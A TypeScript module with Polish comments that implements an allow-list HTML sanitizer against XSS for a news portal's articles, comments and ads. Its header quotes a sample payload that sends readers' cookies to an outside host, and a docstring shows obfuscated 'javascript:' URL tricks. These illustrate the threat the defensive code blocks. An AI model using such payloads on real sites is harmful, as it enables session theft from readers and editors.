/**
 * FAZA 1 / A7 — sanityzacja HTML (ochrona przed XSS).
 *
 * ══════════════════════════════════════════════════════════════════════════
 * KONTEKST
 * ══════════════════════════════════════════════════════════════════════════
 * Portal przyjmuje HTML z trzech źródeł, którym nie wolno ufać:
 *   • treść artykułu z panelu redakcyjnego (`articles.content_html`),
 *   • komentarze mieszkańców,
 *   • ogłoszenia, nekrologi, oferty pracy i nieruchomości.
 *
 * Do tej pory w projekcie nie było ŻADNEJ funkcji sanityzującej — przeszukanie
 * całego drzewa src/ nie zwróciło ani jednego sanitizera. Treść trafiała
 * do bazy i była renderowana bez filtrowania, więc wstawienie do komentarza
 * `<img src=x onerror="fetch('//obcy/'+document.cookie)">` wykonywałoby
 * skrypt w przeglądarce każdego czytelnika artykułu — a gdyby komentarz
 * przeczytał redaktor, atakujący przejąłby jego sesję w panelu.
 *
 * Nie korzystamy z DOMPurify: wymaga DOM-u, którego w Cloudflare Workers
 * nie ma, a jsdom przekracza limit rozmiaru Workera. Implementujemy filtr
 * oparty na białej liście, działający na czystych Web API.
 *
 * ══════════════════════════════════════════════════════════════════════════
 * ZASADA DZIAŁANIA — biała lista, nie czarna
 * ══════════════════════════════════════════════════════════════════════════
 * Czarna lista („usuń <script>”) zawsze przegrywa z pomysłowością atakującego.
 * Dlatego: dozwolone jest WYŁĄCZNIE to, co wymienione. Wszystko inne jest
 * usuwane wraz z zawartością (dla elementów wykonywalnych) albo zamieniane
 * na sam tekst (dla elementów nieznanych, ale nieszkodliwych).
 */

/** Znaczniki dozwolone w treści artykułu (pełny zestaw redakcyjny). */
const ARTICLE_TAGS = new Set([
  'p', 'br', 'hr',
  'h2', 'h3', 'h4', 'h5', 'h6',
  'strong', 'b', 'em', 'i', 'u', 's', 'mark', 'small', 'sub', 'sup',
  'ul', 'ol', 'li',
  'blockquote', 'cite', 'q',
  'a',
  'img', 'figure', 'figcaption',
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption',
  'pre', 'code', 'kbd', 'samp',
  'span', 'div',
  'dl', 'dt', 'dd',
  'time', 'abbr',
])

/** Znaczniki dozwolone w komentarzach — celowo minimalny zestaw. */
const COMMENT_TAGS = new Set(['p', 'br', 'strong', 'b', 'em', 'i', 'u', 'blockquote', 'a', 'ul', 'ol', 'li', 'code'])

/** Atrybuty dozwolone dla poszczególnych znaczników. */
const ALLOWED_ATTRS: Record<string, Set<string>> = {
  a: new Set(['href', 'title', 'rel', 'target']),
  img: new Set(['src', 'alt', 'title', 'width', 'height', 'loading', 'decoding']),
  th: new Set(['colspan', 'rowspan', 'scope']),
  td: new Set(['colspan', 'rowspan']),
  time: new Set(['datetime']),
  abbr: new Set(['title']),
  blockquote: new Set(['cite']),
  q: new Set(['cite']),
  code: new Set(['class']),
  span: new Set(['class']),
  div: new Set(['class']),
  figure: new Set(['class']),
  p: new Set(['class']),
}

/**
 * Znaczniki usuwane RAZEM Z ZAWARTOŚCIĄ.
 * Przy nich nie wystarczy zdjąć samego znacznika — treść wewnątrz jest
 * wykonywalna albo służy do przemycenia kodu.
 */
const STRIP_WITH_CONTENT = ['script', 'style', 'iframe', 'object', 'embed', 'applet', 'noscript', 'template', 'svg', 'math', 'form', 'button', 'input', 'select', 'textarea', 'link', 'meta', 'base', 'frame', 'frameset']

/** Schematy URL uznane za bezpieczne. */
const SAFE_URL_SCHEMES = ['http:', 'https:', 'mailto:', 'tel:']

const escapeText = (value: string) =>
  value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')

/**
 * Weryfikacja adresu URL.
 * Odrzuca `javascript:`, `data:` (poza obrazami), `vbscript:` oraz próby
 * ukrycia schematu przez encje HTML i znaki sterujące — np.
 * `java\u0000script:alert(1)` albo `&#106;avascript:`.
 */
const sanitizeUrl = (rawValue: string, allowDataImage = false): string | null => {
  // Rozkodowanie encji i usunięcie znaków niewidocznych, którymi maskuje się schemat.
  const normalized = rawValue
    .replace(/&#(\d+);?/g, (_, code) => String.fromCharCode(Number(code)))
    .replace(/&#x([0-9a-f]+);?/gi, (_, code) => String.fromCharCode(parseInt(code, 16)))
    .replace(/[\u0000-\u001f\u007f-\u009f\u200b-\u200f\ufeff]/g, '')
    .trim()

  const lower = normalized.toLowerCase()

  if (allowDataImage && /^data:image\/(png|jpe?g|gif|webp|avif);base64,[a-z0-9+/=\s]+$/i.test(normalized)) {
    return normalized
  }

  // Adresy względne i wewnętrzne kotwice są bezpieczne.
  if (/^[/#?]/.test(normalized) && !lower.includes(':')) return normalized

  const schemeMatch = lower.match(/^([a-z][a-z0-9+.-]*):/)
  if (!schemeMatch) return normalized  // brak schematu = adres względny
  if (!SAFE_URL_SCHEMES.includes(schemeMatch[1] + ':')) return null

  return normalized
}

export interface SanitizeOptions {
  /** Profil: pełny redakcyjny albo ograniczony komentarzowy. */
  profile?: 'article' | 'comment'
  /** Dopuszczenie obrazów zapisanych jako data:image;base64. */
  allowDataImages?: boolean
  /** Maksymalna długość wyniku (zabezpieczenie przed ogromnymi treściami). */
  maxLength?: number
}

/**
 * Czyści HTML zgodnie z białą listą.
 *
 *   sanitizeHtml(komentarz, { profile: 'comment' })
 *   sanitizeHtml(trescArtykulu, { profile: 'article' })
 */
export const sanitizeHtml = (input: string, options: SanitizeOptions = {}): string => {
  if (!input) return ''

  const { profile = 'article', allowDataImages = false, maxLength = 500_000 } = options
  const allowedTags = profile === 'comment' ? COMMENT_TAGS : ARTICLE_TAGS

  let html = String(input).slice(0, maxLength)

  // ── 1. Usunięcie komentarzy HTML (mogą kryć kod dla starszych przeglądarek) ──
  html = html.replace(/<!--[\s\S]*?-->/g, '')

  // ── 2. Usunięcie elementów wykonywalnych wraz z zawartością ────────────
  for (const tag of STRIP_WITH_CONTENT) {
    // Para znaczników.
    html = html.replace(new RegExp(`<${tag}\\b[^>]*>[\\s\\S]*?<\\/${tag}\\s*>`, 'gi'), '')
    // Znacznik niedomknięty (celowo urwany, aby ominąć filtr par).
    html = html.replace(new RegExp(`<\\/?${tag}\\b[^>]*>?`, 'gi'), '')
  }

  // ── 3. Przetworzenie pozostałych znaczników ────────────────────────────
  html = html.replace(/<(\/?)([a-zA-Z][a-zA-Z0-9-]*)((?:\s+[^<>]*)?)\/?\s*>/g, (match, closing, tagNameRaw, attrsRaw) => {
    const tagName = String(tagNameRaw).toLowerCase()

    // Znacznik poza białą listą — usuwamy sam znacznik, tekst zostaje.
    if (!allowedTags.has(tagName)) return ''

    // Znacznik zamykający nie ma atrybutów.
    if (closing) return `</${tagName}>`

    const allowedForTag = ALLOWED_ATTRS[tagName] ?? new Set<string>()
    const kept: string[] = []

    const attrPattern = /([a-zA-Z_:][a-zA-Z0-9_:.-]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'<>`]+))/g
    let attrMatch: RegExpExecArray | null
    while ((attrMatch = attrPattern.exec(String(attrsRaw))) !== null) {
      const name = attrMatch[1].toLowerCase()
      const value = attrMatch[2] ?? attrMatch[3] ?? attrMatch[4] ?? ''

      // Każdy atrybut zdarzeniowy (onclick, onerror, onload, onmouseover…)
      // jest bezwarunkowo odrzucany — to główny nośnik XSS.
      if (name.startsWith('on')) continue
      // `style` odrzucamy, bo pozwala na url(javascript:) i expression().
      if (name === 'style') continue
      // Atrybuty spoza listy dla tego znacznika.
      if (!allowedForTag.has(name)) continue

      if (name === 'href' || name === 'src' || name === 'cite') {
        const safe = sanitizeUrl(value, allowDataImages && name === 'src')
        if (safe === null) continue
        kept.push(`${name}="${escapeText(safe)}"`)
        continue
      }

      if (name === 'target') {
        // target dopuszczamy wyłącznie jako _blank i zawsze z rel,
        // żeby obca strona nie miała dostępu do window.opener.
        if (value !== '_blank') continue
        kept.push('target="_blank"')
        continue
      }

      if (name === 'class') {
        // Klasy ograniczamy do bezpiecznego zestawu znaków.
        const cleaned = value.replace(/[^a-zA-Z0-9 _-]/g, '').trim().slice(0, 200)
        if (cleaned) kept.push(`class="${cleaned}"`)
        continue
      }

      kept.push(`${name}="${escapeText(value)}"`)
    }

    // Odnośnik otwierany w nowej karcie musi mieć rel przeciwdziałający
    // przejęciu okna (tabnabbing).
    if (tagName === 'a' && kept.some((attr) => attr.startsWith('target='))) {
      if (!kept.some((attr) => attr.startsWith('rel='))) {
        kept.push('rel="noopener noreferrer"')
      }
    }

    const selfClosing = tagName === 'br' || tagName === 'hr' || tagName === 'img'
    return `<${tagName}${kept.length ? ' ' + kept.join(' ') : ''}${selfClosing ? ' /' : ''}>`
  })

  // ── 4. Ostatnia zapora: usunięcie osieroconych nawiasów ostrych ────────
  html = html.replace(/<(?![a-zA-Z/])/g, '&lt;')

  return html.trim()
}

/**
 * Całkowite usunięcie HTML — zwraca czysty tekst.
 * Stosowane w polach, które nigdy nie powinny zawierać znaczników:
 * tytuł, lead, nazwa autora, temat wiadomości.
 */
export const stripHtml = (input: string, maxLength = 5_000): string => {
  if (!input) return ''
  return String(input)
    .slice(0, maxLength * 4)
    .replace(/<[^>]*>/g, '')
    .replace(/&nbsp;/g, ' ')
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, maxLength)
}

/** Zabezpieczenie wartości wstawianej do atrybutu HTML. */
export const escapeAttribute = escapeText
